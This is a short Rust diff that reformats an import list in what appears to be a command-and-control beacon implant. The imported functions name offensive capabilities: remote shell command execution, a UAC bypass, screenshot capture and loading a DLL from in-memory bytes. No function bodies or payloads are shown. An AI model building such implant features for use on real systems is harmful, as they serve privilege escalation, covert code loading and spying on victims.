@@ -14,7 +14,8 @@ use reqwest::StatusCode;
 #[cfg(windows)]
 use crate::commands::capture_screenshot;
 use crate::commands::{
-    execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes, Command, CommandResult,
+    execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes, Command,
+    CommandResult,
 };
 use crate::config::Config;
 use crate::error::{BeaconError, Result};
